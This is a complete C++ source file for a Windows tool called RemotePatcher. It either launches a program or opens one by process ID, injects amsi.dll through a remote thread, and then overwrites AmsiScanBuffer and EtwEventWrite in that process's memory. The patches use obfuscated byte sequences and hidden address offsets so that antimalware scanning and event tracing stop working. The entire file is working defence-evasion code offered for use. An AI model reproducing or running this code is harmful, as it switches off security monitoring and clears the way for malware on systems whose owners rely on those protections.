#include <Windows.h>
#include <psapi.h>
#include <iostream>
#include <tchar.h>

bool is64bit() {
    if (sizeof(void*) == 4)
        return false;
    return true;
}

void patchAMSI(OUT HANDLE& hProc) {

    HMODULE amsiDllHandle = LoadLibraryA("amsi.dll");
    //FARPROC amsiAddr = GetProcAddress(amsiDllHandle, "AmsiScanBuffer");
    void* dummyAddr = GetProcAddress(amsiDllHandle, "DllRegisterServer");
    char* amsiAddr = (char*)dummyAddr + 6896;

    //char amsiPatch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    //xor eax, eax
    //add    eax, 0x7dfdfe4e
    //add    eax, 0x02090209
    //ret
    char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
 

    if (WriteProcessMemory(hProc, (void*)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr)) {
        std::cout << "[+] Patched amsi!\n";
    }
    else {
        std::cout << "[-] Failed to patch amsi\n";
    }
}

void patchETW(OUT HANDLE& hProc) {

    HMODULE ntDllHandle = LoadLibraryA("ntdll.dll");
    //FARPROC etwAddr = GetProcAddress(ntDllHandle, "EtwEventWrite");
    void* dummyAddr = GetProcAddress(ntDllHandle, "RtlSetLastWin32Error");
    char* etwAddr = (char*)dummyAddr - 5584;

    char etwPatch[4];
    if (is64bit()) {
        char d[] = { 0xC3 };
        memcpy(etwPatch, d, sizeof(d));
    }
    else {
        char d[] = { 0xC2, 0x14, 0x00 };
        memcpy(etwPatch, d, sizeof(d));
    }


    if (WriteProcessMemory(hProc, etwAddr, (PVOID)etwPatch, (SIZE_T)1, (SIZE_T*)nullptr)) {
        std::cout << "[+] Patched etw!\n";
    }
    else {
        std::cout << "[-] Failed to patch etw\n";
    }

}

void loadAMSIdll(OUT HANDLE& hProc) {

    PVOID buf;

    wchar_t dllPath[] = L"C:\\Windows\\System32\\amsi.dll";

    buf = VirtualAllocEx(hProc, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProc, buf, (LPVOID)dllPath, sizeof dllPath, NULL);
    PTHREAD_START_ROUTINE loadLibAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    HANDLE dllThread = CreateRemoteThread(hProc, NULL, 0, loadLibAddr, buf, 0, NULL);
    if (dllThread == NULL) {
        std::cout << "[-] Failed to load amsi.dll";
    }
    else {
        WaitForSingleObject(dllThread, 1000);
    }

    
}

void printHelp() {
    std::cout <<
        "RemotePatcher\n"
        "More info: https://github.com/Hagrid29/RemotePatcher/\n";
    std::cout <<
        "Options:\n"
        "  --exe \"[cmd]\""
        "\tthe program that will be executed and patched\n"
        "  --pid [pid]"
        "\tthe process ID that will be patched\n"
        "  -a"
        "\t\tto NOT patch AMSI\n"
        "  -e"
        "\t\tto NOT patch ETW\n"
        "  -l"
        "\t\tto NOT load amsi.dll\n"
        << std::endl;
    return;
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        printHelp();
        return 0;
    }

    char* mode;
    bool isPatchAMSI = true;
    bool isPatchETW = true;
    bool isLoadDll = true;
    LPSTR cmd;
    HANDLE hProc = NULL;

    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "-h") {
            printHelp();
            return 0;
        }
        else if (arg == "--exe") {
            LPSTARTUPINFOA si = new STARTUPINFOA();
            LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            CreateProcessA(
                NULL,
                (LPSTR)argv[i+1],
                NULL,
                NULL,
                TRUE,
                0,
                NULL,
                NULL,
                si,
                pi
            );
            hProc = pi->hProcess;
        }
        else if (arg == "--pid") {
            hProc = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                FALSE,
                (DWORD)atoi(argv[i+1])
            );
           
        }
        else if(arg == "-a"){
            isPatchAMSI = false;
        }
        else if (arg == "-e") {
            isPatchETW = false;
        }
        else if (arg == "-l") {
            isLoadDll = false;
        }

    }

    if (hProc == NULL) {
        std::cout << "[-] Failed to open target process\n";
        printHelp();
        return 0;
    }

    if (isLoadDll)
        loadAMSIdll(hProc);

    if (isPatchETW)
        patchETW(hProc);

    if (isPatchAMSI)
        patchAMSI(hProc);

    CloseHandle(hProc);
    return 0;
}